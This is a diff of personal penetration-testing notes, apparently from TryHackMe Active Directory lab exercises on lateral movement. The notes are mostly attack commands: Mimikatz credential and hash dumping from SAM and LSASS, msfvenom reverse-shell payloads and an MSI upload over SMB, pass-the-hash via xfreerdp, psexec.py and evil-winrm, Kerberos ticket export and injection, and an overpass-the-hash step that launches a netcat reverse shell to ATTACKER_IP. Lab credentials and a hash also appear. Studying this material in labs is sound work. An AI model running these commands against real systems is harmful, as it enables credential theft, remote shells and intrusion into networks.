@@ -350,13 +350,6 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
    - Get-NetGPO  / Invoke-ShareFinder = shares
 
 
-## MIMIKATZ
-- dumping credentials   
-- mimikatz.exe
-  - privilege::debug ==> Check if we are admin
-    -lsadump::lsa /patch 
-
-
 ## create reverse shell
 - msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
 - use exploit/multi/handler
@@ -470,7 +463,8 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Insta
 - Steps
   - create reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.3 LPORT=4445 -f msi > myinstaller.msi  
   - send file: smbclient -c 'put myinstaller.msi' -U USERNAME -W ZA '//thmiis.za.tryhackme.com/admin$/' PASSWORD
-- 
+- dddd    
+
 ```
 PS C:\> $username = 't1_corine.waters';
 PS C:\> $password = 'Korine.1994';
@@ -480,4 +474,45 @@ PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
 PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
 
 ```
+## Other Authentication Methods
+- pass the hash
+  - mimikatz OR LSASS memory for hashs
+  - 
+### MIMIKATZ
+- Only local user of the machine
+- dumping credentials   
+- mimikatz.exe
+  - privilege::debug ==> Check if we are admin
+  - token::elevate
+  - lsadump::sam ==> Hash from local SAM
+  - sekurlsa::msv ==> Hash from LSASS memory
+    -lsadump::lsa /patch 
+- with the hash
+  - token::revert ==> reestablish token privileges ~= runas /netonly
+  - sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:".exe command"
 
+### With Linux
+- xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+- psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+- evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+
+### Kerberos
+- TGS: Ticket Granting Service ==> only for service
+- TGT: Ticket Granting Ticket ==> request access to services ==> admin credentials
+- mimikatz ==> access to ticket, not session key
+  - privilege::debug
+  - sekurlsa::tickets /export
+  - inject ticket
+    - kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+  - klist => check if injection was correct
+
+### Overpass-the-hash / pass-the-key
+- applied to kerberos
+- we need a key ==> we dont need password
+- privilege::debug
+- sekurlsa::ekeys
+- Reverse sheel:
+  - sekurlsa::pth /user:Administrator /domain:za.tryhackme.com [/rc4_|_/aes128_|_aes256]:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+
+
+### Abusing Behaviour
